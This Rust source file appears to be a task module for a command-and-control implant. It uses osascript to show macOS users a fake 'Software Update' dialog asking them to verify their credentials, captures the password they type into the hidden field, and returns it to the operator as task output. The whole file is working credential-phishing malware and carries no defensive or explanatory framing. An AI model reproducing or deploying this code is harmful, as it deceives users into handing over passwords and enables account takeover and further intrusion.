use crate::structs::Task;
use serde::Deserialize;
use tokio::process::Command;

#[derive(Deserialize)]
struct PromptArgs {
    #[serde(default)]
    icon: String,
    #[serde(default)]
    title: String,
    #[serde(default)]
    message: String,
    #[serde(default = "default_max_tries")]
    max_tries: i32,
}

fn default_max_tries() -> i32 {
    1
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let args: PromptArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    let title = if args.title.is_empty() {
        "Software Update"
    } else {
        &args.title
    };
    let message = if args.message.is_empty() {
        "macOS needs to verify your credentials to continue."
    } else {
        &args.message
    };

    let mut attempts = 0;
    let mut result_output = String::new();

    while attempts < args.max_tries {
        attempts += 1;

        // Use osascript to display a password dialog
        let script = if args.icon.is_empty() {
            format!(
                r#"display dialog "{}" default answer "" with hidden answer with title "{}" buttons {{"Cancel", "OK"}} default button "OK""#,
                message, title
            )
        } else {
            format!(
                r#"display dialog "{}" default answer "" with hidden answer with title "{}" buttons {{"Cancel", "OK"}} default button "OK" with icon POSIX file "{}""#,
                message, title, args.icon
            )
        };

        match Command::new("osascript")
            .args(["-e", &script])
            .output()
            .await
        {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);

                if output.status.success() {
                    // Parse the result - format is "button returned:OK, text returned:PASSWORD"
                    if let Some(text_part) = stdout.split("text returned:").nth(1) {
                        let password = text_part.trim();
                        if !password.is_empty() {
                            result_output = format!(
                                "User entered password: {}",
                                password
                            );
                            break;
                        }
                    }
                    result_output = format!("User clicked OK but entered empty password (attempt {}/{})", attempts, args.max_tries);
                } else {
                    // User clicked Cancel or dialog was dismissed
                    result_output = format!("User cancelled the dialog: {}", stderr.trim());
                    break;
                }
            }
            Err(e) => {
                result_output = format!("Failed to display prompt: {}", e);
                break;
            }
        }
    }

    response.user_output = result_output;
    response.completed = true;
    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
